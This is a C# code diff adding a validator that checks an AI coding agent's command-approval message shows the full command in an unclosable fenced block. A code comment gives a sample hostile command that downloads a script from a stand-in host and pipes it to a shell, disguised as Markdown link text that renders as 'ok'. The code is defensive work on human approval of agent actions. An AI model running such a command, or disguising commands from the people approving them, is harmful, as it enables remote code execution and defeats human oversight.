@@ -37,6 +37,21 @@ namespace AgentBridge.Protocol;
 //     lone tilde are drawn as written.
 public static partial class ApprovalShape
 {
+    // A Codex approval as a host sends it from #209: who asks, literal and in bold, then the whole
+    // command in a fenced block that nothing in it can close, so it is drawn exactly as it runs. An
+    // older host sent the command as Markdown prose ("Needs approval: <command>"), in which an
+    // all-ASCII command such as echo "[ok]($(curl${IFS}-s${IFS}https://x.example/p|sh))" is drawn as
+    // the link text "ok" alone; DrawsAsWritten refuses that on a card drawing Markdown. The host
+    // holds at the machine any approval of its own not in this shape.
+    public static bool IsFencedCommand(string message)
+    {
+        var m = CodexShape().Match(message);
+        if (!m.Success) { return false; }
+        // Longer than any run of backticks in the command, so no line of it closes the block.
+        var fence = m.Groups["fence"].Length;
+        return Ticks().Matches(m.Groups["command"].Value).All(t => t.Length < fence);
+    }
+
     public static bool DrawsAsWritten(string message)
     {
         var lines = message.Replace("\r\n", "\n").Split('\n');
@@ -91,6 +106,11 @@ public static partial class ApprovalShape
 
     [GeneratedRegex(@"^ {0,3}(?:`{3}|~{3})")]
     private static partial Regex FenceShaped();
+
+    // "Allow **<name>**?", the name with every character Markdown would act on backslash-escaped
+    // (CopilotPermission.Literal), a blank line, and the block.
+    [GeneratedRegex(@"\AAllow \*\*(?:\\[^\n]|[^\\`*_\[\]<>&|~^+=!#:\n])+\*\*\?\n\n(?<fence>`{3,})\n(?<command>[\s\S]*)\n\k<fence>\z")]
+    private static partial Regex CodexShape();
 
     // A backslash and the character it escapes, which CommonMark draws as that character.
     [GeneratedRegex(@"\\.")]
